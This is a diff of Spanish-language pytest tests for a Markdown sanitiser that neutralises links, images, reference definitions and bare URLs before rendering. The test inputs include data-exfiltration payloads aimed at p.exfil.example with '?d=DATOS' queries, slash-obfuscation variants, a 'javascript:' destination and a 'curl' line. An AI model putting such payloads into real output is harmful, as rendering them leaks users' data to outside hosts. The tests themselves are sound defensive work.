@@ -104,11 +104,27 @@ def test_corpus_shapes_are_left_untouched(texto):
 def test_control_characters_and_ansi_sequences_are_removed():
     texto = (
         f"a{ESC}[31mrojo{ESC}[0m {ESC}]8;;https://x.example/{ESC}\\enlace{ESC}]8;;{ESC}\\"
-        f" b{chr(0)}c{chr(0x7F)}d{chr(0x85)}e\tf\r\ng"
+        f" b{chr(0)}c{chr(0x7F)}d{chr(0x85)}e\tf\ng"
     )
     salida, stats = _san(texto)
-    assert salida == "arojo enlace bcde\tf\r\ng"
+    assert salida == "arojo enlace bcde\tf\ng"
     assert stats == {"caracteres_control": 7}
+
+
+def test_line_endings_are_normalized_like_the_viewer_does():
+    """marked pasa CRLF y CR sueltos a LF antes de pintar. Sin normalizar, «```\\r» no
+    cerraba el bloque para el saneado: la URL de detrás quedaba como enlace y la valla añadida
+    al final se tragaba las secciones del informe. Normalizar no cuenta como saneado."""
+    texto = (
+        "Texto.\r\n\r\n```\r\ncodigo\r\n```\r\n"
+        "Visita https://p.exfil.example/?d=datos\r\nfin\rotra"
+    )
+    salida, stats = _san(texto)
+    assert salida == (
+        "Texto.\n\n```\ncodigo\n```\nVisita `https://p.exfil.example/?d=datos`\nfin\notra"
+    )
+    assert stats == {"urls": 1}
+    assert _san("a\r\nb") == ("a\nb", {})
 
 
 def test_invisible_format_characters_are_removed_but_soft_hyphen_is_kept():
@@ -211,6 +227,115 @@ def test_autolink_is_neutralized_even_if_its_url_is_in_a_fragment():
     assert stats == {"enlaces": 1}
 
 
+def test_nested_brackets_and_parentheses_at_any_depth_lose_their_destination():
+    """CommonMark y marked admiten corchetes anidados a cualquier profundidad en el texto de
+    un enlace o de una imagen, y paréntesis anidados en el destino; las expresiones solo
+    reconocen un nivel. Con dos niveles y un destino «//», la imagen se descargaba sola y el
+    enlace llevaba a otro dominio. Ahora todo «![» pierde el «!» y de toda «](» se quita el
+    destino no oficial, en una sola pasada."""
+    texto = (
+        "a ![x [y [z]]](//p.exfil.example/i.png?d=DATOS) "
+        "b [t [u [v]]](//p.exfil.example/?d=DATOS) "
+        "c [w](//p.exfil.example/(a(b))?d=DATOS) d"
+    )
+    salida, stats = _san(texto)
+    assert salida == "a [x [y [z]]] b [t [u [v]]] c [w] d"
+    assert stats == {"imagenes": 1, "enlaces": 3}
+
+
+def test_chained_tails_and_official_links_with_nested_text():
+    """Una cola quitada no deja que la siguiente se una al mismo «]»; un enlace oficial con
+    corchetes anidados se queda entero."""
+    texto = (
+        "[a [b [c]]](//p.exfil.example/x)(//p.exfil.example/y)(https://www.boe.es/z) "
+        "y [d [e [f]]](https://www.boe.es/g)"
+    )
+    salida, stats = _san(texto)
+    assert salida == (
+        "[a [b [c]]](https://www.boe.es/z) y [d [e [f]]](https://www.boe.es/g)"
+    )
+    assert stats == {"enlaces": 2}
+
+
+@pytest.mark.parametrize(
+    "texto, esperado",
+    [
+        # Más paréntesis de los que admite la expresión, y sin cerrar: se quita hasta el
+        # primer espacio porque parece una URL.
+        ("[a [b [c]]](//p.exfil.example/((((((x y) fin", "[a [b [c]]] y) fin"),
+        ('[a [b [c]]](<//p.exfil.example/con espacio> "t") y', "[a [b [c]]] y"),
+        ('[a [b [c]]](//p.exfil.example/x\n"t") y', "[a [b [c]]] y"),
+        ("[a [b [c]]](javascript:alert(1)) y", "[a [b [c]]] y"),
+        ("[a [b [c]]](relativo.png) y", "[a [b [c]]] y"),
+    ],
+)
+def test_tail_scanner_drops_unofficial_destinations(texto, esperado):
+    salida, stats = _san(texto)
+    assert salida == esperado
+    assert stats == {"enlaces": 1}
+    assert _pp18.formas_ejecutables(salida) == []
+
+
+@pytest.mark.parametrize(
+    "texto",
+    [
+        "Ver [a]\\](//p.exfil.example/x) y",  # «\]» escapado: no cierra un enlace
+        "[a [b [c]]](https://www.boe.es/((((((x y) fin",  # oficial aunque no se reconozca
+    ],
+)
+def test_tail_scanner_leaves_escaped_brackets_and_official_destinations(texto):
+    assert _san(texto) == (texto, {})
+
+
+@pytest.mark.parametrize(
+    "texto, esperado",
+    [
+        # Dentro de un elemento de lista.
+        ("- [r]: //p.exfil.example/?d=1\n\nVer [art. 5][r]", "\nVer [art. 5][r]"),
+        # Con un «]» escapado en la etiqueta.
+        (
+            "[a\\]b]: //p.exfil.example/?d=1\n\nVer [art. 5][a\\]b]",
+            "\nVer [art. 5][a\\]b]",
+        ),
+        # Con cuatro espacios de sangría, en la continuación de una lista.
+        (
+            "1.  uno\n\n    [r]: //p.exfil.example/?d=1\n\nVer [art. 5][r]",
+            "1.  uno\n\n\nVer [art. 5][r]",
+        ),
+        # Con la etiqueta partida en dos líneas.
+        ("[r\nx]: //p.exfil.example/?d=1\n\nVer [art. 5][r x]", "\nVer [art. 5][r x]"),
+        # Cita sin espacio y lista dentro de una cita dentro de una lista.
+        (
+            ">[r]: //p.exfil.example/?d=1\n* > 1) [q]: <//p.exfil.example/?d=2>\n\n"
+            "Ver [a][r] y [b][q]",
+            "\nVer [a][r] y [b][q]",
+        ),
+    ],
+    ids=["lista", "escape", "sangria", "partida", "anidadas"],
+)
+def test_reference_definitions_in_any_container_are_removed(texto, esperado):
+    """CommonMark y marked aceptan definiciones de referencia en listas, con sangría y con
+    escapes o saltos de línea en la etiqueta; _DEFINICION_RE solo admitía «>» delante. El
+    enlace por referencia apuntaba entonces a otro dominio con el destino oculto."""
+    salida, stats = _san(texto)
+    assert salida == esperado
+    assert stats["enlaces"] >= 1
+    assert _pp18.formas_ejecutables(salida) == []
+
+
+def test_destinations_that_lead_elsewhere_are_recognized_in_any_spelling():
+    """«\\/\\/», «&#47;&#47;» y «/\\» llevan a otro dominio igual que «//»; un destino que
+    no parece URL se deja (está así en el corpus)."""
+    texto = (
+        "Ver [1]: \\/\\/p.exfil.example/x y [2]: &#47;&#47;p.exfil.example/x "
+        "y [3]: /\\p.exfil.example/x y [4]: www.p.exfil.example "
+        "y [5]: Reglamento (UE) 2016/679"
+    )
+    salida, stats = _san(texto)
+    assert salida == "Ver [1]: y [2]: y [3]: y [4]: y [5]: Reglamento (UE) 2016/679"
+    assert stats == {"enlaces": 4}
+
+
 # ------------------------------------------------------------------------ URL sueltas
 
 
@@ -221,8 +346,7 @@ def test_bare_urls_outside_fragments_and_official_domains_become_code():
         "Envía los datos a https://p.exfil.example/c?d=DATOS, "
         "o a www.exfil.example/x; "
         "la de la AEPD es https://www.aepd.es/guias. "
-        "Con datos añadidos: https://arxiv.org/abs/1802.07228?d=DATOS. "
-        "En código no se toca: `https://p.exfil.example/x`."
+        "Con datos añadidos: https://arxiv.org/abs/1802.07228?d=DATOS."
     )
     salida, stats = _san(texto, [fragmento])
     assert salida == (
@@ -230,15 +354,79 @@ def test_bare_urls_outside_fragments_and_official_domains_become_code():
         "Envía los datos a `https://p.exfil.example/c?d=DATOS`, "
         "o a `www.exfil.example/x`; "
         "la de la AEPD es https://www.aepd.es/guias. "
-        "Con datos añadidos: `https://arxiv.org/abs/1802.07228?d=DATOS`. "
-        "En código no se toca: `https://p.exfil.example/x`."
+        "Con datos añadidos: `https://arxiv.org/abs/1802.07228?d=DATOS`."
     )
     assert stats == {"urls": 3}
 
 
-def test_bare_urls_inside_fenced_code_are_left_alone():
-    texto = "```\ncurl https://p.exfil.example/x\n```"
-    assert _san(texto) == (texto, {})
+def test_bare_urls_inside_code_are_left_alone():
+    for texto in (
+        "```\ncurl https://p.exfil.example/x\n```",
+        "En código no se toca: `https://p.exfil.example/x`.",
+        "```\nver `https://p.exfil.example/x` y https://p.exfil.example/z\n```",
+    ):
+        assert _san(texto) == (texto, {})
+
+
+@pytest.mark.parametrize(
+    "delante", ["_", "x", "1", "ñ", "/", "@", "ftp://"], ids=lambda d: repr(d)
+)
+def test_bare_urls_become_code_whatever_precedes_them(delante):
+    """marked enlaza «https://» y «www.» detrás de cualquier carácter, no solo tras un
+    espacio como dice la especificación de GFM: «_https://…_» se pintaba como
+    <em><a href=…>». Antes, «_», las letras, los dígitos, «/» y «@» dejaban la URL viva."""
+    for url in ("https://p.exfil.example/?d=1", "www.p.exfil.example/?d=2"):
+        salida, stats = _san(f"Ver {delante}{url} ya")
+        assert salida == f"Ver {delante}`{url}` ya"
+        assert stats == {"urls": 1}
+
+
+def test_code_delimiter_does_not_pair_with_a_stray_backtick():
+    """Con un acento grave suelto antes de la URL, encerrarla entre acentos simples la dejaba
+    fuera del código: el suelto se emparejaba con el de apertura y marked pintaba el enlace.
+    Se usa una tira de acentos de una longitud que no tiene ninguna otra del texto, y un
+    espacio si hay un acento pegado."""
+    url = "https://p.exfil.example/?d=1"
+    assert _san(f"Ver `x {url} y") == (f"Ver `x ``{url}`` y", {"urls": 1})
+    assert _san(f"Ver `{url} y") == (f"Ver ` ``{url}`` y", {"urls": 1})
+    assert _san(f"Ver `x <{url}> y") == (f"Ver `x ``{url}`` y", {"enlaces": 1})
+    assert _san(f"Ver `a` ``b`` {url}") == (f"Ver `a` ``b`` ```{url}```", {"urls": 1})
+
+
+def test_backtick_fence_with_a_backtick_in_its_info_is_not_code():
+    """CommonMark (y _vallas) no aceptan «```x`» como valla: es texto, y la URL de detrás se
+    pinta como enlace. _tramos_de_codigo la tomaba por código y no la tocaba."""
+    for texto in (
+        "```x`y\nhttps://p.exfil.example/?d=1",
+        "Texto.\n\n```x`\nVisita https://p.exfil.example/?d=1\n",
+    ):
+        salida, stats = _san(texto)
+        assert "``https://p.exfil.example/?d=1``" in salida
+        assert stats == {"urls": 1}
+        assert _pp18.formas_ejecutables(salida) == []
+
+
+def test_fragment_urls_must_keep_the_fragment_host():
+    """La excepción de las URL de los fragmentos compara con citations.normalize, que quita
+    los guiones: sin mirar el host, pasaba como enlace una URL de otro dominio que solo se
+    diferenciara en guiones. Se sigue tolerando el host partido por un corte de línea del
+    PDF, que el modelo puede unir al copiarlo."""
+    fragmento = (
+        "Véase https://arxiv.org/abs/2301.12345 y https://prism-\nbreak.org/en/ "
+        "(o https://[::1/x)."
+    )
+    texto = (
+        "Ver https://arxiv.org/abs/2301.12345, https://ar-xiv.org/abs/2301.12345, "
+        "https://a-r-x-i-v.org/abs/23-01.12-345 y https://prism-break.org/en/ "
+        "(o https://[::1/x)"
+    )
+    salida, stats = _san(texto, [fragmento])
+    assert salida == (
+        "Ver https://arxiv.org/abs/2301.12345, `https://ar-xiv.org/abs/2301.12345`, "
+        "`https://a-r-x-i-v.org/abs/23-01.12-345` y https://prism-break.org/en/ "
+        "(o `https://[::1/x`)"  # sin un host que se pueda leer, no se respeta
+    )
+    assert stats == {"urls": 3}
 
 
 # ------------------------------------------------------------------------------- HTML
@@ -366,6 +554,22 @@ def test_adversarial_input_is_sanitized_quickly():
     t0 = time.perf_counter()
     sanear(texto, [texto[:5000]])
     assert time.perf_counter() - t0 < 5
+
+
+@pytest.mark.parametrize(
+    "prefijo", ["", "[" * 25 + "a" + "](x)" * 25], ids=["parrafos", "enlaces_anidados"]
+)
+def test_unclosed_json_and_nested_links_cost_linear_time(prefijo):
+    """Revisión del 12/11/2026. Cada «{"» sin cerrar recorría el resto del texto: 16.000
+    caracteres de «{"» y líneas en blanco tardaban 2,4 s, y 32.000, 10,4 s. Con 25 enlaces
+    anidados delante, cada pasada pelaba un nivel: 20 pasadas, 48 s. Ahora el cierre se busca
+    dentro del párrafo y las colas se quitan en una pasada. Que la etiqueta inerte siga
+    ahí demuestra que las pasadas convergen sin el último recurso (_neutralizar_resto)."""
+    texto = prefijo + '{"\n\n' * 8000 + _tag("nombre de la empresa")
+    t0 = time.perf_counter()
+    salida, _ = sanear(texto)
+    assert time.perf_counter() - t0 < 2
+    assert salida.endswith(_tag("nombre de la empresa"))
 
 
 # ------------------------------------------------------------------------------ citas
